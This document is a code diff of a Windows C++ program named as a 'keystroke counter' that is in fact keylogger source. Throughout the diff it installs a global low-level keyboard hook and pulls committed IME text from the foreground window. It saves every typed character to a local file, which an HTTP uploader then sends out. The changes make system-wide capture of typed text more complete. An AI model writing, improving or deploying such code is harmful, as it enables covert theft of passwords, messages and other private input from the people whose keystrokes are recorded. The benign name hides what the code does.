@@ -1,13 +1,11 @@
 #define WIN32_LEAN_AND_MEAN
 #define NOMINMAX
 #include <windows.h>
+#include <imm.h>
 #include "keystroke_counter.h"
 #include "http_upload.h"
 
-// Freestanding build (-nostdlib) provides no CRT, but the compiler still emits
-// calls to memset/memcpy for aggregate zero-initialization and for RtlCopyMemory.
-// Supply them here; the volatile loops keep the optimizer from folding them back
-// into self-referential libcalls.
+// Freestanding CRT shims (unchanged)
 extern "C" void* memset(void* destination, int value, size_t count) {
     volatile unsigned char* bytes = static_cast<volatile unsigned char*>(destination);
     while (count--) *bytes++ = static_cast<unsigned char>(value);
@@ -34,10 +32,14 @@ struct Counter {
     bool pending;
     bool timerArmed;
     SRWLOCK fileLock;
+    HKL layout;           // current foreground layout
+    bool deadKeyPending;  // dead-key marker
 };
 Counter counter;
 
-// Resolve beside the executable, independently of the launch working directory.
+void ArmTimerIfNeeded(); // forward declaration
+
+// Resolve beside the executable
 wchar_t* ResolveCountPath() {
     constexpr wchar_t filename[] = L"yourtext.txt";
     constexpr DWORD maximum = 32768;
@@ -71,26 +73,50 @@ bool InitializeFile() {
     HANDLE file = CreateFileW(counter.path, GENERIC_READ | FILE_APPEND_DATA,
         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
         nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (file != INVALID_HANDLE_VALUE) {
-        CloseHandle(file);
-    }
-    
-    // Initialize text buffer
+    if (file != INVALID_HANDLE_VALUE) CloseHandle(file);
+
     counter.textBuffer = static_cast<wchar_t*>(HeapAlloc(GetProcessHeap(), 0, 4096 * sizeof(wchar_t)));
     if (!counter.textBuffer) return false;
     counter.textBufferSize = 4096;
     counter.textBufferUsed = 0;
-    
+    counter.layout = GetKeyboardLayout(0);
+    counter.deadKeyPending = false;
     return true;
+}
+
+bool EnsureBufferCapacity(size_t needed) {
+    if (counter.textBufferUsed + needed <= counter.textBufferSize) return true;
+    size_t newSize = counter.textBufferSize ? counter.textBufferSize : 4096;
+    while (newSize < counter.textBufferUsed + needed) newSize *= 2;
+    wchar_t* resized = static_cast<wchar_t*>(HeapReAlloc(GetProcessHeap(), 0,
+        counter.textBuffer, newSize * sizeof(wchar_t)));
+    if (!resized) return false;
+    counter.textBuffer = resized;
+    counter.textBufferSize = newSize;
+    return true;
+}
+
+void AppendText(const wchar_t* text, size_t length) {
+    if (!length) return;
+    AcquireSRWLockExclusive(&counter.fileLock);
+    if (!EnsureBufferCapacity(length)) {
+        ReleaseSRWLockExclusive(&counter.fileLock);
+        return;
+    }
+    RtlCopyMemory(counter.textBuffer + counter.textBufferUsed, text,
+                  length * sizeof(wchar_t));
+    counter.textBufferUsed += length;
+    counter.pending = true;
+    ReleaseSRWLockExclusive(&counter.fileLock);
+    ArmTimerIfNeeded();
 }
 
 bool SaveTotal() {
     if (!counter.pending || !counter.path) return true;
-    
+
     AcquireSRWLockExclusive(&counter.fileLock);
     wchar_t* textToSave = counter.textBuffer;
     size_t textToSaveLength = counter.textBufferUsed;
-    // Reset buffer for next use
     counter.textBufferUsed = 0;
     counter.pending = false;
     ReleaseSRWLockExclusive(&counter.fileLock);
@@ -100,12 +126,10 @@ bool SaveTotal() {
     HANDLE file = CreateFileW(counter.path, FILE_APPEND_DATA,
         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
         nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (file == INVALID_HANDLE_VALUE) {
-        return false;
-    }
-    
-    // Convert to UTF-8 to safely handle any typed characters
-    int size_needed = WideCharToMultiByte(CP_UTF8, 0, textToSave, (int)textToSaveLength, NULL, 0, NULL, NULL);
+    if (file == INVALID_HANDLE_VALUE) return false;
+
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, textToSave,
+        (int)textToSaveLength, NULL, 0, NULL, NULL);
     bool success = false;
     DWORD written = 0;
     if (size_needed > 0) {
@@ -120,73 +144,92 @@ bool SaveTotal() {
             HeapFree(GetProcessHeap(), 0, utf8_text);
         }
     }
-
     CloseHandle(file);
     return success;
 }
 
-void CountEvent(HWND window, DWORD deviceType, USHORT flags, USHORT vKey, USHORT makeCode) {
-    if (deviceType != RIM_TYPEKEYBOARD || (flags & RI_KEY_BREAK)) return;
-    
-    BYTE ks[256] = {0};
-    GetKeyboardState(ks);
-    wchar_t charBuffer[5];
-    UINT scanCode = makeCode | (flags & RI_KEY_E0 ? 0xE000 : 0);
-    
-    // Translate virtual key and scan code to actual typed character(s)
-    int result = ToUnicode(vKey, scanCode, ks, charBuffer, 4, 0);
-    if (result > 0) {
-        AcquireSRWLockExclusive(&counter.fileLock);
-        
-        // Check if we need to resize buffer
-        if (counter.textBufferUsed + result >= counter.textBufferSize) {
-            size_t newSize = counter.textBufferSize * 2;
-            wchar_t* resized = static_cast<wchar_t*>(HeapReAlloc(GetProcessHeap(), 0, 
-                counter.textBuffer, newSize * sizeof(wchar_t)));
-            if (resized) {
-                counter.textBuffer = resized;
-                counter.textBufferSize = newSize;
-            } else {
-                // If we can't resize, just drop the new input - not ideal but prevents crash
-                ReleaseSRWLockExclusive(&counter.fileLock);
-                return;
-            }
-        }
-        
-        // Copy characters to buffer
-        RtlCopyMemory(counter.textBuffer + counter.textBufferUsed,
-                      charBuffer, (size_t)result * sizeof(wchar_t));
-        counter.textBufferUsed += result;
-        counter.pending = true;
-        ReleaseSRWLockExclusive(&counter.fileLock);
-        
-        if (!counter.timerArmed) {
-            counter.timerArmed = SetTimer(window, kSaveTimer, kSaveDelayMs, nullptr) != 0;
-            if (!counter.timerArmed) SaveTotal();
+// IME: read committed composition string from foreground window's IME context
+void DrainImeComposition() {
+    HWND foreground = GetForegroundWindow();
+    if (!foreground) return;
+    HIMC imc = ImmGetContext(foreground);
+    if (!imc) return;
+
+    DWORD size = ImmGetCompositionStringW(imc, GCS_RESULTSTR, nullptr, 0);
+    if (size > 0 && size != (DWORD)-1) {
+        wchar_t stackBuf[256];
+        wchar_t* buf = (size / sizeof(wchar_t) <= 256)
+            ? stackBuf
+            : static_cast<wchar_t*>(HeapAlloc(GetProcessHeap(), 0, size));
+        if (buf) {
+            LONG got = ImmGetCompositionStringW(imc, GCS_RESULTSTR, buf, size);
+            if (got > 0) AppendText(buf, (size_t)got / sizeof(wchar_t));
+            if (buf != stackBuf) HeapFree(GetProcessHeap(), 0, buf);
         }
     }
+    ImmReleaseContext(foreground, imc);
+}
+
+// Low-level keyboard hook
+HHOOK g_hook = nullptr;
+HWND g_window = nullptr;
+
+bool HookShouldCapture(DWORD vk) {
+    switch (vk) {
+        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
+        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
+        case VK_MENU: case VK_LMENU: case VK_RMENU:
+        case VK_CAPITAL: case VK_NUMLOCK: case VK_SCROLL:
+        case VK_LWIN: case VK_RWIN:
+        case VK_PROCESSKEY: // IME key, handled via DrainImeComposition
+            return false;
+    }
+    return true;
+}
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+        const KBDLLHOOKSTRUCT* kb = reinterpret_cast<const KBDLLHOOKSTRUCT*>(lParam);
+        if (kb && !(kb->flags & LLKHF_INJECTED) && HookShouldCapture(kb->vkCode)) {
+            // Resolve foreground layout
+            HKL layout = counter.layout;
+            HWND fg = GetForegroundWindow();
+            if (fg) {
+                DWORD tid = GetWindowThreadProcessId(fg, nullptr);
+                if (tid) layout = GetKeyboardLayout(tid);
+            }
+            counter.layout = layout;
+
+            // Flush any IME-committed text first
+            DrainImeComposition();
+
+            BYTE ks[256];
+            GetKeyboardState(ks);
+            wchar_t chars[8];
+            int r = ToUnicodeEx(kb->vkCode, kb->scanCode, ks, chars, 8, 0, layout);
+
+            if (r > 0) {
+                AppendText(chars, (size_t)r);
+                counter.deadKeyPending = false;
+            } else if (r == -1) {
+                // Dead key: stored internally by Windows, next key composes
+                counter.deadKeyPending = true;
+            }
+            // r == 0: control / IME in progress — ignore
+        } else if (kb && !(kb->flags & LLKHF_INJECTED) && wParam == WM_KEYDOWN) {
+            // Enter/Space may commit IME text
+            DrainImeComposition();
+        }
+    }
+    return CallNextHookEx(g_hook, nCode, wParam, lParam);
 }
 
 bool CheckpointBeforeClear(void* context) {
     (void)context;
-    // Reuse SaveTotal to flush any pending text before the uploader clears/acts
     return SaveTotal();
 }
 
 LRESULT CALLBACK CounterWindow(HWND window, UINT message, WPARAM wParam, LPARAM lParam) {
-    if (message == WM_INPUT) {
-        RAWINPUT input;
-        UINT size = sizeof(input);
-        const UINT read = GetRawInputData(reinterpret_cast<HRAWINPUT>(lParam), RID_INPUT,
-                                          &input, &size, sizeof(RAWINPUTHEADER));
-        if (read != UINT(-1) && read >= sizeof(RAWINPUTHEADER) + sizeof(RAWKEYBOARD)
-            && input.header.dwType == RIM_TYPEKEYBOARD) {
-            CountEvent(window, input.header.dwType, input.data.keyboard.Flags, 
-                       input.data.keyboard.VKey, input.data.keyboard.MakeCode);
-        }
-        SecureZeroMemory(&input, sizeof(input));
-        return DefWindowProcW(window, message, wParam, lParam);
-    }
     if (message == WM_TIMER && wParam == kSaveTimer) {
         KillTimer(window, kSaveTimer);
         counter.timerArmed = false;
@@ -194,6 +237,13 @@ LRESULT CALLBACK CounterWindow(HWND window, UINT message, WPARAM wParam, LPARAM 
         return 0;
     }
     return DefWindowProcW(window, message, wParam, lParam);
+}
+
+void ArmTimerIfNeeded() {
+    if (!counter.timerArmed && g_window) {
+        counter.timerArmed = SetTimer(g_window, kSaveTimer, kSaveDelayMs, nullptr) != 0;
+        if (!counter.timerArmed) SaveTotal();
+    }
 }
 } // namespace
 
@@ -204,23 +254,30 @@ DWORD RunKeystrokeCounter(HANDLE stopEvent) {
     windowClass.hInstance = instance;
     windowClass.lpszClassName = kWindowClass;
     if (!RegisterClassW(&windowClass)) return 1;
-    
+
     HWND window = CreateWindowExW(0, kWindowClass, L"", 0, 0, 0, 0, 0,
                                  HWND_MESSAGE, nullptr, instance, nullptr);
     if (!window) {
         UnregisterClassW(kWindowClass, instance);
         return 1;
     }
-    
-    InitializeFile();
-    
-    RAWINPUTDEVICE keyboard = {0x01, 0x06, RIDEV_INPUTSINK, window};
+    g_window = window;
+
+    if (!InitializeFile()) {
+        DestroyWindow(window);
+        UnregisterClassW(kWindowClass, instance);
+        return 1;
+    }
+
+    // Low-level hook — no Raw Input registration needed
+    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, nullptr, 0);
+
     CountUploadSource uploadSource = {counter.path, &counter.fileLock, stopEvent,
                                      CheckpointBeforeClear, &counter};
     HANDLE uploader = nullptr;
     DWORD result = 0;
-    
-    if (!RegisterRawInputDevices(&keyboard, 1, sizeof(keyboard))) {
+
+    if (!g_hook) {
         result = 1;
     } else {
         uploader = StartCountUploader(&uploadSource);
@@ -228,29 +285,25 @@ DWORD RunKeystrokeCounter(HANDLE stopEvent) {
             const DWORD wait = MsgWaitForMultipleObjectsEx(1, &stopEvent, INFINITE,
                                                           QS_ALLINPUT, MWMO_INPUTAVAILABLE);
             if (wait == WAIT_OBJECT_0) break;
-            if (wait == WAIT_FAILED) {
-                result = 1;
-                break;
-            }
+            if (wait == WAIT_FAILED) { result = 1; break; }
             MSG message;
-            for (unsigned batch = 0; batch < 256 && PeekMessageW(&message, nullptr, 0, 0, PM_REMOVE); ++batch) {
+            for (unsigned batch = 0; batch < 256 &&
+                 PeekMessageW(&message, nullptr, 0, 0, PM_REMOVE); ++batch) {
                 DispatchMessageW(&message);
             }
         }
-        keyboard.dwFlags = RIDEV_REMOVE;
-        keyboard.hwndTarget = nullptr;
-        RegisterRawInputDevices(&keyboard, 1, sizeof(keyboard));
     }
-    
+
+    if (g_hook) { UnhookWindowsHookEx(g_hook); g_hook = nullptr; }
     SetEvent(stopEvent);
     if (counter.timerArmed) KillTimer(window, kSaveTimer);
     SaveTotal();
-    
+
     if (uploader) {
         WaitForSingleObject(uploader, INFINITE);
         CloseHandle(uploader);
     }
-    
+
     if (counter.path) HeapFree(GetProcessHeap(), 0, counter.path);
     if (counter.textBuffer) HeapFree(GetProcessHeap(), 0, counter.textBuffer);
     counter.path = nullptr;
@@ -259,8 +312,3 @@ DWORD RunKeystrokeCounter(HANDLE stopEvent) {
     UnregisterClassW(kWindowClass, instance);
     return result;
 }
-
-
-
-
-// .\build.ps1 -LlvmBin "C:\Users\JahanmalAgha\AppData\Local\Android\Sdk\ndk\30.0.16248370\toolchains\llvm\prebuilt\windows-x86_64\bin"
